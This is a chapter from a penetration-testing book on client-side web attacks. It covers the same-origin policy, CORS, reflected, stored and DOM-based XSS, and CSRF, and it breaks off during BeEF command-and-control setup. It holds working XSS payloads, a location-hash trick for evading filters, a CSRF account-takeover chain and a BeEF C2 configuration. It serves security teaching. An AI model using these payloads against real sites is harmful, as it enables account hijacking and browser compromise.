<html><head></head><body><div class="chapter" title="Chapter&#xA0;9.&#xA0;Practical Client-Side Attacks"><div class="titlepage"><div><div><h1 class="title"><a id="ch09"/>Chapter 9. Practical Client-Side Attacks</h1></div></div></div><p>When we talk about client-side attacks, there is a tendency to discredit their viability in compromising an environment. After all, executing JavaScript in the browser is far less sexy than executing native code and popping a shell on the application server itself. What's the point of being able to execute heavily sandboxed JavaScript in a short-lived browsing session? How much damage can an attacker do with this type of vulnerability? Quite a bit, as it turns out.</p><p>In this chapter, we will explore client-side attacks, with a heavy emphasis on XSS. We will also look at <span class="strong"><strong>Cross-Site Request Forgery</strong></span> (<span class="strong"><strong>CSRF</strong></span>) attacks and discuss the implications of the <span class="strong"><strong>same-origin policy</strong></span> (<span class="strong"><strong>SOP</strong></span>). Next, we will look at ways to weaponize XSS vulnerabilities using BeEF.</p><p>By the end of the chapter, you should be comfortable with:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Stored, reflected, and DOM-based XSS</li><li class="listitem" style="list-style-type: disc">CSRF and possible attacks and limitations</li><li class="listitem" style="list-style-type: disc">BeEF, the de facto tool for client-side exploitation in the browser</li></ul></div><p>We will spend quite a bit of time on BeEF, as it makes XSS attacks viable. It allows us to easily perform social engineering attacks to execute malicious native code, implement a keylogger, persist our access, and even tunnel traffic through the victim's browser.</p><div class="section" title="SOP"><div class="titlepage"><div><div><h1 class="title"><a id="ch09lvl1sec52"/>SOP</h1></div></div></div><p>Consider a scenario <a id="id404" class="indexterm"/>where a target is logged into their Gmail account (<a class="ulink" href="http://mail.google.com">mail.google.com</a>) in one of the open browser tabs. In another tab, they navigate to a different site, on a different domain, which contains attacker code that wants access to that Gmail data. Maybe they were socially engineered to visit this particular site or maybe they were redirected there through a malicious advertising (malvertising) campaign on a<a id="id405" class="indexterm"/> well-known news site.</p><p>The <a id="id406" class="indexterm"/>attacker code may try to open a connection to the <a class="ulink" href="http://mail.google.com">mail.google.com</a> domain, and because the victim is already authenticated in the other browser tab, the code should be able to read and send emails as well by forging requests to Gmail. JavaScript provides all the tools necessary to accomplish all of this, so why isn't everything on fire?</p><p>The answer, as we will see in detail shortly, is because of the SOP. The SOP prevents this exact attack and, unless the attacker can inject their code directly into <a class="ulink" href="http://mail.google.com">mail.google.com</a>, they will not be able to read any of its sensitive information.</p><p>The SOP was introduced back in the Netscape days because the potential for abuse was very real without it. Simply put, the SOP restricts sites from accessing information from other sites, unless the origin of the request source is the same as the destination.</p><p>There is a simple algorithm to determine whether the SOP has been breached. The browser will compare the schema, domain, and port of the source (origin) site to that of the destination (target) site and if any one item doesn't match, read access will be denied.</p><p>In our earlier example, the target site in the attack would be the following URI: <a class="ulink" href="https://mail.google.com/mail/u/0/#inbox">https://mail.google.com/mail/u/0/#inbox</a>, which would translate to the following origin triple:</p><div class="informalexample"><pre class="programlisting">( <span class="strong"><strong>[schema]</strong></span>, <span class="strong"><strong>[domain]</strong></span>, <span class="strong"><strong>[port]</strong></span> ) -&gt; ( <span class="strong"><strong>https</strong></span>, <span class="strong"><strong>mail.google.com</strong></span>, <span class="strong"><strong>443</strong></span> )</pre></div><p>Attacker code running on <a class="ulink" href="https://www.cnn.com/">https://www.cnn.com/</a> would be denied read access because the domain doesn't match:</p><div class="informalexample"><pre class="programlisting">(<span class="strong"><strong>https</strong></span>, <span class="strong"><strong>www.cnn.com</strong></span>, <span class="strong"><strong>443</strong></span> ) != ( <span class="strong"><strong>https</strong></span>, <span class="strong"><strong>mail.google.com</strong></span>, <span class="strong"><strong>443</strong></span> )</pre></div><p>Even malicious code running on <a class="ulink" href="https://www.google.com/">https://www.google.com/</a> would fail to access Gmail because the domain does not match, even though they are on the same physical server:</p><div class="informaltable"><table border="1"><colgroup><col style="text-align: left"/><col style="text-align: left"/><col style="text-align: left"/></colgroup><thead><tr><th style="text-align: left" valign="bottom">
<p>Origin</p>
</th><th style="text-align: left" valign="bottom">
<p>Target</p>
</th><th style="text-align: left" valign="bottom">
<p>Result</p>
</th></tr></thead><tbody><tr><td style="text-align: left" valign="top">
<p>
<a class="ulink" href="https://mail.google.com/mail/u/0/#inbox">https://mail.google.com/mail/u/0/#inbox</a>
</p>
</td><td style="text-align: left" valign="top">
<p>
<a class="ulink" href="https://mail.google.com/mail/u/0/#inbox">https://mail.google.com/mail/u/0/#inbox</a>
</p>
</td><td style="text-align: left" valign="top">
<p>Allowed, port <code class="literal">443</code> is implied</p>
</td></tr><tr><td style="text-align: left" valign="top">
<p>
<a class="ulink" href="http://mail.google.com/mail/u/0/#inbox">http://mail.google.com/mail/u/0/#inbox</a>
</p>
</td><td style="text-align: left" valign="top">
<p>
<a class="ulink" href="https://mail.google.com/mail/u/0/#inbox">https://mail.google.com/mail/u/0/#inbox</a>
</p>
</td><td style="text-align: left" valign="top">
<p>Denied, schema mismatch</p>
</td></tr><tr><td style="text-align: left" valign="top">
<p>
<a class="ulink" href="https://mail.google.com:8443/u/0/#inbox">https://mail.google.com:8443/u/0/#inbox</a>
</p>
</td><td style="text-align: left" valign="top">
<p>
<a class="ulink" href="https://mail.google.com/mail/u/0/#inbox">https://mail.google.com/mail/u/0/#inbox</a>
</p>
</td><td style="text-align: left" valign="top">
<p>Denied, port mismatch</p>
</td></tr><tr><td style="text-align: left" valign="top">
<p>
<a class="ulink" href="https://dev.mail.google.com/u/0/#inbox">https://dev.mail.google.com/u/0/#inbox</a>
</p>
</td><td style="text-align: left" valign="top">
<p>
<a class="ulink" href="https://mail.google.com/u/0/#inbox">https://mail.google.com/u/0/#inbox</a>
</p>
</td><td style="text-align: left" valign="top">
<p>Denied, domain mismatch</p>
</td></tr></tbody></table></div><p>This makes sense from a defense perspective. The scenario we outlined earlier would be a nightmare if not for the SOP. However, if we look closely at web apps on the internet, we'll notice that almost all include content such as images, stylesheets, and even JavaScript code.</p><p>Sharing<a id="id407" class="indexterm"/> resources cross-origin or cross-site has its benefits for the application. Static content can be offloaded to CDNs, which are typically hosted on other domains (think Facebook's <code class="literal">fbcdn.net</code>, for example), allowing for greater flexibility, speed, and ultimately, cost savings while serving users.</p><p>The SOP does allow access to certain types of resources cross-origin to ensure the web functions normally. After all, when the focus is user experience, a security policy that makes the application unusable is not a great security policy, no matter how secure it may actually be.</p><p>The SOP will permit the following types of cross-origin objects to be embedded into the origin from any other site:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Images</li><li class="listitem" style="list-style-type: disc">Stylesheets</li><li class="listitem" style="list-style-type: disc">Scripts (which the browser will gladly execute!)</li><li class="listitem" style="list-style-type: disc">Inline frames (<code class="literal">iframe</code>)</li></ul></div><p>We can include images from our CDN, and the browser will download the image bytes and render them onto the screen. We cannot, however, read the bytes programmatically using JavaScript. The same goes for other static content that is allowed by the SOP. We can, for example, include a stylesheet with JavaScript, but we cannot read the actual contents of the stylesheet if the origin does not match.</p><p>This is true for <code class="literal">iframe</code> elements as well. We can create a new <code class="literal">iframe</code> object and point it to an arbitrary URL, and the browser will gladly load the content. We cannot, however, read the contents if we are in breach of the SOP.</p><p>In the following example, we are creating an <code class="literal">iframe</code> element inside the <a class="ulink" href="https://bittherapy.net">https://bittherapy.net</a> web application, emulating what an XSS attack or malicious cross-origin script could accomplish if allowed to execute in the context of <a class="ulink" href="http://bittherapy.net">bittherapy.net</a>:</p><div class="mediaobject"><img src="graphics/B09238_09_01.jpg" alt="SOP"/><div class="caption"><p>Figure 9.1: Creating an iframe element using the browser console</p></div></div><p>First, we<a id="id408" class="indexterm"/> create a new <code class="literal">iframe</code> element using the <code class="literal">document.createElement()</code> function and store it in the <code class="literal">frame</code> variable. Next, we set the <code class="literal">iframe</code> URL to <a class="ulink" href="https://bittherapy.net">https://bittherapy.net</a> using the <code class="literal">src</code> property on <code class="literal">frame</code>. Lastly, we add the newly created <code class="literal">iframe</code> object to the document using the <code class="literal">document.body.append()</code> function.</p><p>We can see that the frame source (<code class="literal">frame.src</code>) matches the parent origin triple exactly and when we try to read the contents of the <code class="literal">iframe</code> element's head using <code class="literal">frame.contentDocument</code>, we succeed. The SOP was not violated.</p><p>Conversely, creating an <code class="literal">iframe</code> to <a class="ulink" href="https://bing.com/">https://bing.com/</a> within the <a class="ulink" href="https://bittherapy.net">https://bittherapy.net</a> application will work, and the object will be created, but we won't be able to access its contents, as we can see in the following figure:</p><div class="mediaobject"><img src="graphics/B09238_09_02.jpg" alt="SOP"/><div class="caption"><p>Figure 9.2: Creating a cross-origin frame and attempting to access its contents fails</p></div></div><p>The <a id="id409" class="indexterm"/>Bing search app loaded just fine, as we can see in the rendered site on the right, but programmatically, we cannot read the contents because that violates the SOP.</p><p>JavaScript is also accessible cross-origin and this is usually a good thing. Offloading your JavaScript libraries to a CDN can reduce load times and bandwidth usage. <span class="strong"><strong>CDNJS</strong></span> is<a id="id410" class="indexterm"/> a prime example of how sites can benefit from including JavaScript from a third-party.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note46"/>Note</h3><p>CDNJS is an<a id="id411" class="indexterm"/> open-source web CDN providing almost every conceivable JavaScript library. More information on this great service can be found at <a class="ulink" href="https://cdnjs.com/">https://cdnjs.com/</a>.</p></div></div><p>Any other type of data that we may try to load cross-origin using JavaScript would be denied. This includes fonts, JSON, XML, or HTML.</p><p>Cookies deserve a special mention when talking about the SOP. Cookies are typically tied to either the domain or a parent domain, and can be restricted to secure HTTP connections. Browsers can also be instructed to disallow JavaScript access to certain cookies, to prevent attacks such as XSS from extracting session information.</p><p>The cookie policy is fine-tuned by the application server when the cookie is initially set, using the <code class="literal">Set-Cookie</code> HTTP response header. As I said earlier, unless otherwise specified, cookies are typically bound to the application domain name. Wildcard domains can also be used, which would instruct the browser to pass the cookies for requests to all subdomains as well.</p><p>Applications <a id="id412" class="indexterm"/>will leverage cookies to manage authentication and user sessions. A unique value will be sent to the client once they've successfully logged in, and the browser will pass this value back to the application for all subsequent requests, provided the domain and path match what was specified when the cookie was initially set.</p><p>The side effect of this behavior is that a user only has to login to the application once and the browser will maintain the authenticated session by passing cookies in the background with every request. This greatly improves user experience but can also be abused by attackers.</p></div></div>
<div class="section" title="Cross-origin resource sharing"><div class="titlepage"><div><div><h1 class="title"><a id="ch09lvl1sec53"/>Cross-origin resource sharing</h1></div></div></div><p>In the age of microservices, where <a id="id413" class="indexterm"/>web application components are decoupled and run as separate instances on totally different domains, the SOP presents some challenges.</p><p>Attempting to read some API data presented in JSON format would normally be denied by the SOP unless the origin triple matches. This is inconvenient, and applications become hard to develop and scale if we are constrained to the same domain, port, and scheme.</p><p>To loosen up the SOP, <span class="strong"><strong>cross-origin resource sharing</strong></span> (<span class="strong"><strong>CORS</strong></span>) was introduced, making developers happy again. CORS allows a particular site to specify which origins are allowed access to read content that is normally denied by the SOP.</p><p>The application server HTTP response can include an <code class="literal">Access-Control-Allow-Origin</code> header, which the client can use to determine whether it should complete the connection and retrieve the data.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note47"/>Note</h3><p>CORS is well<a id="id414" class="indexterm"/>-documented on the Mozilla Developer Network: <a class="ulink" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS</a>
</p></div></div><p>We can see Spotify's public API CORS policy using <code class="literal">curl</code>:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~# curl -I <span class="strong"><strong>https://api.spotify.com/v1/albums</strong></span>
HTTP/2 401 
www-authenticate: Bearer realm="spotify"
content-type: application/json
content-length: 74
<span class="strong"><strong>access-control-allow-origin: *</strong></span>
access-control-allow-headers: Accept, Authorization, Origin, Content-Type, Retry-After
access-control-allow-methods: GET, POST, OPTIONS, PUT, DELETE, PATCH
access-control-allow-credentials: true
access-control-max-age: 604800
via: 1.1 google
alt-svc: clear

root@spider-c2-1:~#</pre></div><p>This particular API is public and, therefore, will inform the client that all origins are allowed to read response contents. This is done with the value for <code class="literal">Access-Control-Allow-Origin</code> set to a wildcard: <code class="literal">*</code>. Private APIs will typically use a more specific value, such as an expected URL.</p><p>The Spotify server<a id="id415" class="indexterm"/> responds with other <code class="literal">Access-Control</code> headers, which specify which methods and headers are accepted, and whether credentials can be passed with each request. The CORS policy can get quite deep, but for the most part, we are concerned with what origin a particular target site allows.</p></div>
<div class="section" title="XSS"><div class="titlepage"><div><div><h1 class="title"><a id="ch09lvl1sec54"/>XSS</h1></div></div></div><p>Another prevalent type of <a id="id416" class="indexterm"/>attack that I still encounter out in the field very frequently is XSS. XSS comes in a few flavors, but they all provide attackers with the same thing: arbitrary JavaScript code execution in the client's browser.</p><p>While this may not sound as great as executing code on the actual application server, XSS attacks can be devastating when used in targeted attacks.</p><div class="section" title="Reflected XSS"><div class="titlepage"><div><div><h2 class="title"><a id="ch09lvl2sec35"/>Reflected XSS</h2></div></div></div><p>The more common type of <a id="id417" class="indexterm"/>XSS vulnerability is the reflected or non-persistent kind. A <span class="strong"><strong>reflected XSS</strong></span> attack happens <a id="id418" class="indexterm"/>when the application accepts input from the user, either via parameters in the URL, body, or HTTP headers, and it returns it back to the user without sanitizing it first. This type of attack is referred to as non-persistent because once the user navigates away from the vulnerable page, or they close the browser, the exploit is over. Reflected XSS attacks typically require some social engineering due to the ephemeral nature of the payload.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note48"/>Note</h3><p>To showcase XSS attacks, we will once again use the badguys project from Mike Pirnat. The web application code can be downloaded from <a class="ulink" href="https://github.com/mpirnat/lets-be-bad-guys">https://github.com/mpirnat/lets-be-bad-guys</a>.</p></div></div><p>To showcase this type of vulnerability, I have loaded the application on <code class="literal">badguys.local</code>. The <code class="literal">/cross-site-scripting/form-field</code> URL is vulnerable to an XSS attack in the <code class="literal">qs</code> parameter:</p><div class="informalexample"><pre class="programlisting">http://badguys.local/cross-site-scripting/form-field?qs=test</pre></div><p>The application will take the <a id="id419" class="indexterm"/>user-inputted value and pre-fill a text field somewhere on the page. This is common behavior for login forms, where the user may enter the wrong password and the page will reload to display an error message. In an attempt to improve user experience, the application automatically fills the username field with the previously inputted value. If the username value is not sanitized, bad things can happen.</p><p>To confirm the <a id="id420" class="indexterm"/>vulnerability, we can feed it the Elsobky polyglot payload covered in previous chapters and observe the application's behavior:</p><div class="informalexample"><pre class="programlisting">jaVasCript:/*-/*'/*\'/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</pre></div><p>Once we drop the bomb, while the application's server is unaffected, the page rendered by the browser is a different story. We can see the fallout from this attack by inspecting the application's source code around the affected input field:</p><div class="mediaobject"><img src="graphics/B09238_09_03.jpg" alt="Reflected XSS"/><div class="caption"><p>Figure 9.3: The polyglot reveals an XSS vulnerability</p></div></div><p>The alert box pops up after the polyglot inserts an <code class="literal">&lt;svg&gt;</code> tag with the <code class="literal">onload</code> property set to execute <code class="literal">alert()</code>. This is possible because the <a id="id421" class="indexterm"/>application reflected the payload without removing <a id="id422" class="indexterm"/>dangerous characters. The browser interpreted the first double-quote as part of the input field, leading to the vulnerability.</p></div><div class="section" title="Persistent XSS"><div class="titlepage"><div><div><h2 class="title"><a id="ch09lvl2sec36"/>Persistent XSS</h2></div></div></div><p>A <span class="strong"><strong>persistent XSS</strong></span>, also called <span class="strong"><strong>stored XSS</strong></span>, is similar to a <a id="id423" class="indexterm"/>reflected attack in that the input is not sanitized and is<a id="id424" class="indexterm"/> eventually reflected back to a visiting user. The <a id="id425" class="indexterm"/>difference, however, is that a persistent XSS is typically stored in the application's database and presented to any user visiting the affected page. Stored XSS usually does not require us to trick the user into visiting the vulnerable page using a specially crafted URL, and could speed things up if the target user does not use the application frequently.</p><p>A simple example of stored XSS is the comments section of a blog post. If the user input (the comment) is not sanitized before being stored, any user who reads the comment will execute whatever payload was stored in the application.</p><p>Perhaps the most famous example of a<a id="id426" class="indexterm"/> stored XSS attack is the <span class="strong"><strong>Samy worm</strong></span> (aka <span class="strong"><strong>MySpace Worm</strong></span>, or <span class="strong"><strong>JS.Spacehero</strong></span>).</p><p>Due to the lack of proper input sanitization, Samy was able to unleash a piece of JavaScript code that would force the victim, who was logged in to their own MySpace account, to perform a couple of actions:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Update their profile to include the phrase "but most of all, Samy is my hero"</li><li class="listitem" style="list-style-type: disc">Send a friend request to Samy Kamkar's profile</li></ul></div><p>At first glance, this seemed<a id="id427" class="indexterm"/> fairly harmless, and the few users who visited Samy's profile <a id="id428" class="indexterm"/>would be mildly annoyed and eventually move on. What made Samy Kamkar famous, however, was the fact that the victim's profile was also updated to include the same JavaScript payload that the victim executed while browsing the infected profile. This turned the XSS attack into an XSS worm.</p><p>In a mere 20 hours, Samy's profile received over a million friend requests, indicating the real impact of this particular stored XSS attack.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note49"/>Note</h3><p>A full explanation of how this clever attack was carried out, including the final payload, can be found on Samy Kamkar's personal site: <a class="ulink" href="https://samy.pl/myspace/tech.html">https://samy.pl/myspace/tech.html</a>.</p></div></div><p>While Samy's worm did no real damage to users, similar persistent XSS vulnerabilities can be used to attack users en masse, gather session cookies, and target them for social engineering. Low-privileged users could potentially attack administrative users and escalate privileges by storing XSS code, which is later processed when the administrator views the infected page.</p><p>Discovering stored XSS vulnerabilities can be a bit more challenging, as we don't always know where and when the payload will be reflected. This is where the OOB vulnerability discovery techniques we covered in previous chapters can help.</p></div><div class="section" title="DOM-based XSS"><div class="titlepage"><div><div><h2 class="title"><a id="ch09lvl2sec37"/>DOM-based XSS</h2></div></div></div><p>This particular <a id="id429" class="indexterm"/>type of XSS attack happens when the application's client-side<a id="id430" class="indexterm"/> code reads data from the DOM and uses it in an unsafe manner.</p><p>The DOM is essentially a data structure in the browser memory that contains all of the objects in the current page. This includes HTML tags and their properties, the document title, the head, the body, and even the URL. JavaScript can interface with the DOM and modify, add, or delete almost any part of it, immediately affecting the page itself.</p><p>The best way to illustrate the <a id="id431" class="indexterm"/>impact of DOM XSS is with a simple vulnerable <a id="id432" class="indexterm"/>application.</p><p>In the following screenshot, we have some JavaScript code that will welcome a user to the page:</p><div class="mediaobject"><img src="graphics/B09238_09_04.jpg" alt="DOM-based XSS"/><div class="caption"><p>Figure 9.4: A sample page vulnerable to DOM XSS</p></div></div><p>This application will scan the document URL for the position of the <code class="literal">name</code> parameter using the <code class="literal">document.URL.indexOf()</code> function. It will then grab the text starting just after <code class="literal">name=</code> using the <code class="literal">document.URL.substring()</code> function and store the value in the <code class="literal">name</code> variable.</p><p>On line 11, the application will walk the DOM for the <code class="literal">span</code> element <code class="literal">welcome</code>. Line 12 is where the magic happens, also known as the sink. The application will fill the contents of the <code class="literal">span</code> element with that of the <code class="literal">name</code> URL parameter fetched earlier, using the <code class="literal">innerHTML</code> property of the <code class="literal">welcome</code> object.</p><p>We can see the intended functionality of the application in the following figure:</p><div class="mediaobject"><img src="graphics/B09238_09_05.jpg" alt="DOM-based XSS"/><div class="caption"><p>Figure 9.5: The DOM is updated to include the name from the URL</p></div></div><p>The <code class="literal">span</code> element in the<a id="id433" class="indexterm"/> DOM was updated with the value passed via the URL and <a id="id434" class="indexterm"/>everything looks good. The application provides dynamic page content without the need for server-side programming.</p><p>The XSS vulnerability exists because we are able to pass in arbitrary values via the URL, which will be reflected in the DOM. The application parses the URL and fills in the <code class="literal">welcome</code> element without sanitizing the input, allowing us to insert something other than a name and to potentially execute more JavaScript code.</p><p>This attack is similar to your typical reflected XSS, with an important difference: the JavaScript code is not reflected by the server code, instead, it is populated by the client code. The web server will still see the payload in the request and any web application firewalls could still potentially block our attack by dropping the connection, but any application input sanitization will have no effect here.</p><p>Another issue with this particular piece of code is that the URL <code class="literal">GET</code> parameters are not safely parsed. It uses string functions to walk the entire URL and fetch arbitrary data.</p><p>If we're constructing a malicious URL, we don't actually need to use the question mark (<code class="literal">?</code>) to delimit parameters. We can instead use the hash character (<code class="literal">#</code>). This is referred to as the location hash and yes, it is part of the DOM, accessible via JavaScript. Browsers do not send hash data alongside HTTP requests. This gives us the advantage of not submitting our payload to the server, bypassing the web application firewall or server-side XSS filters altogether, while still being able to execute JavaScript code.</p><p>Our payload URL to exploit this DOM XSS will look like this:</p><div class="informalexample"><pre class="programlisting">http://c2.spider.ml/welcome.html#name=&lt;svg/onload=alert(1)&gt;</pre></div><p>The application client-side code works just fine and inserts our XSS payload right into the DOM:</p><div class="mediaobject"><img src="graphics/B09238_09_06.jpg" alt="DOM-based XSS"/><div class="caption"><p>Figure 9.6: DOM-based XSS successfully executing</p></div></div><p>If we inspect the<a id="id435" class="indexterm"/> application server log, we can see that our payload was never sent over <a id="id436" class="indexterm"/>the wire:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/web# php -S 0.0.0.0:80
PHP 7.0.30-0+deb9u1 Development Server started
Listening on http://0.0.0.0:80
Document root is /var/www/html
Press Ctrl-C to quit.
[] 196.247.56.62:59885 [200]: /welcome.html?name=Dade%20Murphy
<span class="strong"><strong>[] 196.247.56.62:63010 [200]: /welcome.html</strong></span>
</pre></div><p>While this attack resulted in the execution of the same JavaScript payload, the fact that network and server-side controls cannot defend against these attacks makes DOM XSS unique. Being able to leverage the location hash to send our payload gives us an advantage over the defenders, as they will not only be powerless to stop the attack with compensating server-side controls, but they will not even be able to see the payload.</p></div></div>
<div class="section" title="CSRF"><div class="titlepage"><div><div><h1 class="title"><a id="ch09lvl1sec55"/>CSRF</h1></div></div></div><p>Earlier, I briefly<a id="id437" class="indexterm"/> mentioned that browsers will pass along all associated cookies to applications automatically. For example, if the user has authenticated to the <code class="literal">http://email.site</code> application, a session cookie will be created, which can be used to make authenticated requests. A CSRF attack takes advantage of this user experience feature to abuse overly-trusting applications.</p><p>It is common for applications to allow users to update their profile with custom values that are passed via <code class="literal">GET</code> or <code class="literal">POST</code> requests. The application will, of course, check to see whether the request is authenticated and perhaps even sanitize the input to prevent SQLi or XSS attacks.</p><p>Consider a scenario where we've tricked the victim into visiting a malicious site, or perhaps we've embedded some JavaScript code in a known-good site. This particular piece of code is designed to perform a CSRF attack and target the <code class="literal">http://email.site</code> application.</p><p>As attackers, we've done some digging and realized that the email application provides a way to update the password recovery email through the profile page: <code class="literal">http://email.site/profile/</code>.</p><p>When we submit a change on our own test account, we notice the following URL being called:</p><div class="informalexample"><pre class="programlisting">http://email.site/profile/update?recovery_email=test@email.local</pre></div><p>If we're able to modify another user's password recovery email, we can reset their credentials and potentially login as that user. This is where a CSRF attack comes into play. While the application does validate the email address value and the request must be authenticated, there are no other security checks.</p><p>A CSRF attack embeds an invisible <code class="literal">iframe</code>, <code class="literal">img</code>, or similar element in a malicious site, which makes a cross-origin request to the target application using attacker-supplied values. When the victim's browser attempts to load the <code class="literal">iframe</code> or <code class="literal">img</code> element, it will also pass the session cookies along with the request. From the application's point of view, this is a valid request and it is allowed to execute. Attackers may not be able to read the response, since it is made cross-origin (remember SOP?) but the damage has already been done.</p><p>In our malicious site, we embed an <code class="literal">img</code> tag with the source pointing to the profile update URL containing our email address as the new value.</p><p>A typical CSRF attack flows something like the following:</p><div class="mediaobject"><img src="graphics/B09238_09_07.jpg" alt="CSRF"/><div class="caption"><p>Figure 9.7: CSRF attack flow</p></div></div><p>When the user visits our malicious site, the image will attempt to load by making an authenticated <code class="literal">GET</code> request to the target application, updating the recovery email for the victim on the email application. We now have the ability to request a password reset for the victim's account and login to the email site directly.</p><p>To prevent CSRF attacks, developers <a id="id438" class="indexterm"/>should implement <span class="strong"><strong>CSRF tokens</strong></span>. These are unique, one-time numbers (<span class="strong"><strong>nonces</strong></span>) generated for every request to a protected page. When a request to <a id="id439" class="indexterm"/>update any part of the application is made, the client must send this unique value, along with the request, before the data is allowed to change. Theoretically, attackers embedding <code class="literal">img</code> tags in their own malicious site would have no way of guessing this particular token, therefore CSRF attacks would fail.</p><p>CSRF tokens are a good defense against CSRF, if implemented properly. First of all, the value should be unique, non-deterministic, and hard to guess. A small random integer does not make a good token because it can easily be brute-forced. An MD5 hash of the username or any other static guessable value is not good enough either.</p><p>CSRF tokens should be tied to the user session and if that session is destroyed, the tokens should go with it. If tokens are global, attackers can generate them on their own accounts and use them to target others.</p><p>CSRF tokens should also be time-limited. After a reasonable amount of time, the token should expire and should never come up again. If tokens are passed via <code class="literal">GET</code> requests, they might be cached by proxies or the browser, and attackers can simply harvest old values and reuse them.</p><p>When we encounter CSRF tokens in a target application, we should check for issues with the implementation. You'd be surprised how many times the CSRF token is issued but ignored when passed back to the server.</p><p>CSRF is an interesting vulnerability that can often be chained together with other issues, such as XSS, to perform an effective attack against a particular target.</p><p>Say we had discovered a stored XSS vulnerability in the profile page of the email application. We could update our name to reflect some XSS payload. Since we cannot affect other users' profile names, this XSS payload would only really trigger for our account. This is referred to as <span class="strong"><strong>self-XSS</strong></span>. If the <a id="id440" class="indexterm"/>same application is also vulnerable to CSRF attacks on both the <a id="id441" class="indexterm"/>login and logout pages, we could force a user to logout and also force them to login as somebody else.</p><p>First of all, we would submit an XSS payload into our own profile name and save it for later. Then, we could build a malicious site that performs the following operations in order:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">Uses CSRF to force the victim to logout of the application</li><li class="listitem">Uses CSRF to log the victim back in using our credentials</li><li class="listitem">Uses CSRF to navigate to the application profile page containing the self-XSS payload</li><li class="listitem">Executes the XSS payload on the victim's browser</li></ol></div><p>The malicious code would look something like this:</p><div class="mediaobject"><img src="graphics/B09238_09_08.jpg" alt="CSRF"/><div class="caption"><p>Figure 9.8: Malicious self-XSS and CSRF attack code</p></div></div><p>The <code class="literal">http://email.site/profile/</code> contains the self-XSS code we stored earlier, which would execute on the unsuspecting target once the <code class="literal">iframe</code> loads.</p><p>What can we do with JavaScript code running in the victim's browser, but under our account session? It doesn't make sense to steal session cookies, but we have other options, as we will see next.</p></div>
<div class="section" title="BeEF"><div class="titlepage"><div><div><h1 class="title"><a id="ch09lvl1sec56"/>BeEF</h1></div></div></div><p>An XSS <a id="id442" class="indexterm"/>vulnerability is difficult to exploit successfully in most circumstances. When I'm talking about practical client-side attacks, I don't mean taking a screenshot of the <code class="literal">alert(1)</code> popup window for the report!</p><p>During an engagement, the XSS vulnerability may be a viable way to attack users and gain a foothold on the network. Conducting XSS attacks can be difficult, as, in most cases, you only have one shot at it. We need to execute code and do everything we have to do before the user closes the browser session. Extracting the session token or other sensitive data is easy enough, but what if we want to take our attack to the next level? Ideally, we want to take full control of the browser and have it do our bidding, perhaps automating some more advanced attacks.</p><p>BeEF is a great tool that was created by Wade Alcorn to allow for the easy exploitation of XSS vulnerabilities.</p><p>BeEF has a server component that provides command and control. Clients, or zombies, are hooked using a JavaScript snippet hosted on the C2 server itself. The zombie will check in periodically with the C2 server and receive commands, which can include:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Executing arbitrary JavaScript code</li><li class="listitem" style="list-style-type: disc">Social engineering to deliver malware</li><li class="listitem" style="list-style-type: disc">Persistence</li><li class="listitem" style="list-style-type: disc">Metasploit integration</li><li class="listitem" style="list-style-type: disc">Information gathering</li><li class="listitem" style="list-style-type: disc">…and much more</li></ul></div><p>To exploit a client with BeEF, we'd have to hook it using an XSS attack or by backdooring an application's client code. The JavaScript payload would execute and load the hook from our BeEF C2, giving us access to execute more code packaged inside BeEF as commands.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note50"/>Note</h3><p>Installing BeEF is straightforward and it is <a id="id443" class="indexterm"/>available on GitHub: <a class="ulink" href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a>. BeEF is also installed on Kali Linux by default. Although, in some cases, it's better to have it running in your C2 server in the cloud.</p></div></div><p>We can clone the latest version from the GitHub repository using the <code class="literal">git clone</code> command:</p><div class="informalexample"><pre class="programlisting">root@spider-c2:~# git clone https://github.com/beefproject/beef</pre></div><p>The source comes with an <code class="literal">install</code> script, which will setup the environment for us. Inside the <code class="literal">beef</code> folder, execute the <code class="literal">install</code> script:</p><div class="informalexample"><pre class="programlisting">root@spider-c2:~/beef# <span class="strong"><strong>./install</strong></span>
[WARNING]  This script will install BeEF and its required dependencies (including operating system packages).
Are you sure you wish to continue (Y/n)? <span class="strong"><strong>y</strong></span>
[INFO]  Detecting OS...
[INFO]  Operating System: Linux
[INFO]  Launching Linux install...
[INFO]  Detecting Linux OS distribution...
[INFO]  OS Distribution: Debian
[INFO]  Installing Debian prerequisite packages…
[...]</pre></div><p>BeEF can be fine-tuned <a id="id444" class="indexterm"/>using the YAML configuration file, <code class="literal">config.yaml</code>. There are lots of options to tweak but for us, but the most important are the following:</p><div class="informalexample"><pre class="programlisting">beef:
[...]
  credentials:
    <span class="strong"><strong>user:   "admin"</strong></span>
    <span class="strong"><strong>passwd: "peanut butter jelly time"</strong></span>

[...]
  restrictions:
    # subnet of IP addresses that can hook to the framework
    <span class="strong"><strong>permitted_hooking_subnet: "172.217.2.0/24"</strong></span>
    # subnet of IP addresses that can connect to the admin UI
    <span class="strong"><strong>permitted_ui_subnet: "196.247.56.62/32"</strong></span>

  # HTTP server
  http:
    debug: false #Thin::Logging.debug, very verbose. Prints also full exception stack trace.
    <span class="strong"><strong>host: "0.0.0.0"</strong></span>
    <span class="strong"><strong>port: "443"</strong></span>
    <span class="strong"><strong>public: "c2.spider.ml"</strong></span>

[...]

  https:
    <span class="strong"><strong>enable: true</strong></span>
    <span class="strong"><strong>key: "/etc/letsencrypt/live/spider.ml/privkey.pem"</strong></span>
